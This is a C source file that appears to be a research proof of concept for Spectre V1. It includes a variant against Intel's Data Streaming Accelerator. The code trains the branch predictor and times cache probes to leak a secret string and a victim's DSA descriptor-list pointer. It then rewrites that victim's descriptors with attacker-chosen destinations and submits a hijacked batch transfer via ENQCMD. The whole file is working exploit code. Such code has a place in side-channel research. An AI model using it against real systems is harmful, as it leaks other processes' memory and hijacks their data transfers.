#include "DSASpectre.h"

int main(int argc, char *argv[]) {
    srand(time(NULL));
    bufferSize = (unsigned int)strtoul(argv[1], NULL, 10);

    //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
    //~~~~~~~~~~~~ BEGIN TESTS ~~~~~~~~~~~~//
    TestSpectre();
    spectreDSABatch();
    return 0;
}

// Actual ASM functionality to send descriptor 
uint8_t enqcmd(void *_dest, const void *_src){
    uint8_t retry;
    //startTimeEnQ = rdtsc();
    asm volatile(".byte 0xf2, 0x0f, 0x38, 0xf8, 0x02\t\n"
                 "setz %0\t\n"
                 : "=r"(retry) : "a" (_dest), "d" (_src));
    //endTimeEnQ = rdtsc();
    //while(compRec.status!=1){}
    //endTimeDSA = rdtsc();
    //startTimeDSA = endTimeEnQ;

    return 0; // ((endTimeEnQ-startTimeEnQ)>15000 || (endTimeDSA-startTimeDSA)>15000);
}

void spectreDSABatch(){
    printf("\n|-- DSA Batch Spectre V1 --|\n------------------\n");
    int randIndex, junk, runs=500, runCount=0;
    bool breakLoop = false;
    size_t attkAddr, randX, x;
    volatile uint8_t *addr;
    uint64_t start, end;

    // Setup Victim's Descriptor List and Batch Descriptor //
    secretDescList = aligned_alloc(64, MAX_BATCHSZ*64);
    for(int i=0; i<MAX_BATCHSZ; i++)
    {
        srcVictimArr[i] = aligned_alloc(64, bufferSize);
        dstVictimArr[i] = aligned_alloc(64, bufferSize);

        for(int j=0; j<bufferSize; j++)
            srcVictimArr[i][j] = rand()%255;
    }

    for(int i=0; i<MAX_BATCHSZ; i++)
    {
        secretDescList[i].opcode = DSA_OPCODE_MEMMOVE;
        secretDescList[i].src_addr  = (uintptr_t)srcVictimArr[i];
        secretDescList[i].dst_addr  = (uintptr_t)dstVictimArr[i];
        secretDescList[i].xfer_size = bufferSize;
        secretDescList[i].flags = IDXD_OP_FLAG_CC;
    }
    secretBatchDesc.opcode          = DSA_OPCODE_BATCH;
    secretBatchDesc.flags           = IDXD_OP_FLAG_RCR;
    secretBatchDesc.flags          |= IDXD_OP_FLAG_CRAV;
    secretBatchDesc.xfer_size       = MAX_BATCHSZ;
    secretBatchDesc.src_addr        = (uintptr_t)secretDescList;
    secretBatchDesc.completion_addr = (uintptr_t)&secretCompRec;

    // Now setup vars needed for Spectre Attack //
    secretDSAGuess = malloc(64);
    
    // Speed up attack by only trying to spec load bytes 16-23
    attkTargetBytes = ((uint8_t *)&secretBatchDesc)+16;
    attkAddr = (size_t)((char*)attkTargetBytes - (char*)arr1DSA);

    // Make sure to flush arr2 before starting
    initDSAArr2AndFlush();

    // BEGIN SPECTRE BATCH ATTACK //
    printf("Secret addr we are trying to discover using DSABatchSpectre: '%p'\n", (uintptr_t)secretDescList);
    
    start = rdtsc();
    // Iterate through secretLen, so we can see every character of password
    for(int i=0; i<64; i++)
    {
        // Reset Guess Map       
        for (int j=0; j<256; j++)
            guessMap[j] = 0;

        for(int j=0; j<runs; j++)
        {
            breakLoop=false;
            // Flush out entire Arr2 from cache
            for (int k=0; k<256; k++)
                flush(&arr2DSA[k*512]);

            // Now train PHT, which we must do by flooding
            // gadget function with *mainly* valid data - so PHT assumes true...
            randX = rand()%(arr1DSALen);//tries % array1_size;
            for(int k=0; k<30; k++)
            {
                flush(&arr1DSALen);
                for (int delay = 0; delay<100; delay++) {}

                // Set x to either safe index or attk index to manipulate PHT [4]
                x = ((k % 6) - 1) & ~0xFFFF;
                x = (x | (x >> 16));
                x = randX ^ (x & (attkAddr ^ randX));

                dummyReturnVar += spectreDSAGadget(x);
            }

            // Now, we can finally use our trained PHT to try and access secret, by
            // iterating over our arr2 and seeing which index has fastest hit time
            for(int k=0; k<256; k++)
            {
                // Index needs to be shifted around to avoid stride prediction [4]
                randIndex = ((k * 167) + 1) & 255;
                addr = &arr2DSA[randIndex * 512];
                start = __rdtscp(& junk);
                junk = * addr;
                end = __rdtscp(& junk);

                // Cache hit - mark index as likely number for secret letter
                if (end-start <= 80 && randIndex != arr1DSA[runs%arr1DSALen])
                {
                    guessMap[randIndex]++;

                    // Early break condition -- it's definitely this char.
                    if(j>=(runs/50) && guessMap[randIndex]>((2*j)/3))
                    {
                        runCount += j;
                        breakLoop = true;
                        break;
                    } 
                }
            }

            if(breakLoop)
                break;

            if(j==runs-1)
                runCount += runs;
        }

        int k=0;
        // Grab the highest likely value, assign to current secret letter
        for(int j=0; j<256; j++)
            k=(guessMap[j]>guessMap[k])? j:k;
        secretDSAGuess[i] = (uint8_t)k;

        // Move on to the next letter in the secret
        attkAddr++;
    }

    // Check speculated results:
    printf("\nSpectreGuess (MSB->LSB): ");
    for(int i=sizeof(secretDSAGuess)-1; i>=0; i--)
        printf("%lu\t",secretDSAGuess[i]);

    printf("\n   Target    (MSB->LSB): ");
    for(int i=sizeof(attkTargetBytes)-1; i>=0; i--)
        printf("%lu\t",attkTargetBytes[i]);
    
    // Check that the pointer can be remade to original:
    memcpy(&stolenPointer, secretDSAGuess, sizeof(stolenPointer));
    printf("\n\nOriginal Pointer:    '%p'\n", (uintptr_t)secretDescList);
    printf("Constructed Pointer: '%p'\n", (uintptr_t)stolenPointer);

    // If we have been successful, create our own DSA Batch Op - with *our* specified destination locations...
    if((uintptr_t)secretDescList == stolenPointer)
    {
        printf("\nSuccessfully reconstructed secret pointer! Inserting our malicious destinations for OPs...\n");
        buildDSAAttackOp();
        end = rdtsc();
        for(int i=0; i<MAX_BATCHSZ; i++)
            valueCheck(srcVictimArr[i], dstAttkArr[i], bufferSize, "[DSA Batch Attack] ");
        printf("\n--[SUCCESS]-- Successfully hijacked %luKB-Sized Transfer!\n", (bufferSize*MAX_BATCHSZ)/1024);
        printf("-- Leakage Rate of Attack: %.3f bits/cycle\n", (double)((bufferSize*MAX_BATCHSZ) * 8) / (double)((end-start)-RTDSC_latency));
    }else{
        end = rdtsc();
        printf("\n~FAIL~: Secret Pointer Mismatch!\n");
    }

    printf("\n     |--Elapsed Runtime for Attack--|\n\t Cycles =\t%ld\n\t Runs =\t\t%d\n", end-start, runCount);

    printf("--------------------------------\n\n");
}

// Build our own DSA bulk op from stolenPointer
void volatile buildDSAAttackOp(){
    int fd;

    // WQ Path Check
    fd = open(wqPath, O_RDWR);
    detailedAssert((fd >= 0), "DSA buildDSAAttackOp() - failed opening WQ portal file from path.");

    // Setup our 'stolen' Descriptor List
    stolenDescList = (struct dsa_hw_desc *)stolenPointer;

    // Change the destination to something *we* want...
    for(int i=0; i<MAX_BATCHSZ; i++)
        dstAttkArr[i] = aligned_alloc(64, bufferSize);

    // Modify the descriptors in list, to give it this new location
    for(int i=0; i<MAX_BATCHSZ; i++)
        stolenDescList[i].dst_addr  = (uintptr_t)dstAttkArr[i];

    // Setup the actual batch descriptor
    attkrBatchDesc.opcode          = DSA_OPCODE_BATCH;
    attkrBatchDesc.flags           = IDXD_OP_FLAG_RCR;
    attkrBatchDesc.flags          |= IDXD_OP_FLAG_CRAV;
    attkrBatchDesc.xfer_size       = MAX_BATCHSZ;
    attkrBatchDesc.src_addr        = stolenPointer;
    attkrBatchDesc.completion_addr = (uintptr_t)&compRec;

    // Config Completion Record info
    compRec.status = 0;

    // Map this Descriptor (<- user space) to DSA WQ portal (<- specific address space (privileged?))
    wq_portal = mmap(NULL, PORTAL_SIZE, PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
    detailedAssert(!(wq_portal == MAP_FAILED), "Descriptor Init() failed to map to portal.");
    close(fd);

    // Send command
    enqcmd(wq_portal, &attkrBatchDesc);

    uint64_t killSwitch=0;
    while(compRec.status!=1 && killSwitch<1000000){killSwitch++;}

    if(compRec.status==1)
        printf("Successful DSA Batch Spectre Attack Performed!!\n");
    else
        printf("Failed to process DSA Batch Op! ([Tries=%lu] [Err=0x%x])\n", killSwitch, compRec.status);
}

void TestSpectre(){
    printf("\n|-- Spectre V1 --|\n------------------\n");
    int i, j, k, randIndex, junk, runs=500, runCount=0;
    bool breakLoop = false;
    volatile uint8_t *addr;
    uint64_t start, end;
    size_t attkAddr = (size_t)(spectreSecret - (char*)arr1);
    size_t randX, x;
    secretLen = strlen(spectreSecret);
    secretGuess = malloc(secretLen + 1);

    printf("Secret we are trying to discover using SpectreV1: '%s'\n", spectreSecret);

    // Init Arr2 with random, valid characters - then clflush everything
    initArr2AndFlush();
    
    printf("Running %d tests for each letter of secret code...", runs);

    start = rdtsc();
    // Iterate through secretLen, so we can see every character of password
    for(i=0; i<secretLen; i++){
        // Reset Guess Map to 0        
        for (int j=0; j<256; j++)
            guessMap[j] = 0;

        for(j=0; j<runs; j++)
        {
            breakLoop = false;
            // Flush out entire Arr2 from cache
            for (k=0; k<256; k++)
                flush(&arr2[k*512]);

            // Now train PHT, which we must do by flooding
            // gadget function with *mainly* valid data - so PHT assumes true...
            randX = rand()%(arr1Len);//tries % array1_size;
            for(k=0; k<30; k++)
            {
                flush(&arr1Len);
                for (int delay = 0; delay<100; delay++) {}

                // Set x to either safe index or attk index to manipulate PHT [4]
                x = ((k % 6) - 1) & ~0xFFFF;
                x = (x | (x >> 16));
                x = randX ^ (x & (attkAddr ^ randX));

                dummyReturnVar += spectreV1Gadget(x);
            }

            // Now, we can finally use our trained PHT to try and access secret, by
            // iterating over our arr2 and seeing which index has fastest hit time
            for(k=0; k<256; k++)
            {
                // Index needs to be shifted around to avoid stride prediction [4]
                randIndex = ((k * 167) + 13) & 255;
                addr = &arr2[randIndex * 512];
                start = __rdtscp(& junk);
                junk = * addr;
                end = __rdtscp(& junk);

                // Cache hit - mark index as likely number for secret letter
                if (end-start <= 80 && randIndex != arr1[runs%arr1Len])
                {
                    //printf("\tDebug [%d][%d] -- Guess = %c || (runs/50)=%d, guessMap[randIndex]=%d ||\n", i, j, randIndex, (runs/50), guessMap[randIndex]);
                    guessMap[randIndex]++;

                    // Early break condition -- it's definitely this char.
                    if(j>=(runs/50) && guessMap[randIndex]>(j/2))
                    {
                        runCount += j;
                        breakLoop = true;
                        break;
                    } 
                }
            }

            if(breakLoop)
                break;

            if(j==runs-1)
                runCount += runs;
        }

        k=0;
        // Grab the highest likely value, assign to current secret letter
        for(j=0; j<256; j++)
            k=(guessMap[j]>guessMap[k])? j:k;
        secretGuess[i] = (char)k;

        // Move on to the next letter in the secret
        attkAddr++;
    }

    printf("\n\n Spectre Guess:  '%s'\n", secretGuess);
    printf("Original Secret: '%s'\n", spectreSecret);
            
    if(strcmp(spectreSecret,secretGuess)==0)
        printf("\nSUCCESS: Discovered Secret Matches!\n");
    else
        printf("\n~FAIL~: Secret Mismatch!\n");
    end = rdtsc();

    printf("-- Leakage Rate of Attack: %.3f bits/cycle\n", (double)((secretLen) * 8) / (double)((end-start)-RTDSC_latency));    
    printf("\n     |--Elapsed Runtime for Spy--|\n\t Cycles =\t%ld\n\t Runs =\t\t%d\n", end-start, runCount);

    printf("--------------------------------\n\n");
}

// For DSA Batch version of arr2 
void initDSAArr2AndFlush(){

    // Fill with rand ints
    for(int i=0; i<arr2DSALen; i++)
        arr2DSA[i] = rand()%1000;

    // Flush Arr2 from cache, along with arr2DSALen
    for(int i=0; i<arr2DSALen; i++)
        flush(&arr2DSA[i]);

    flush(&arr2DSALen);
}

// Spectre test fns..
void initArr2AndFlush(){
    srand(time(0));

    // Fill with rand ints
    for(int i=0; i<arr2Len; i++)
        arr2[i] = rand()%1000;

    // Flush Arr2 from cache, along with arr2Len
    for(int i=0; i<arr2Len; i++)
        flush(&arr2[i]);

    flush(&arr2Len);
}

// Use speculative execution to load our Descr
uint8_t spectreDSAGadget(size_t x){
    if(x<arr1DSALen)
        return arr2DSA[arr1DSA[x] * 512];

    return 0;
}

// Use speculative execution to load our Descr
uint8_t spectreV1Gadget(size_t x){
    if(x<arr1Len)
        return arr2[arr1[x] * 512];

    return 0;
}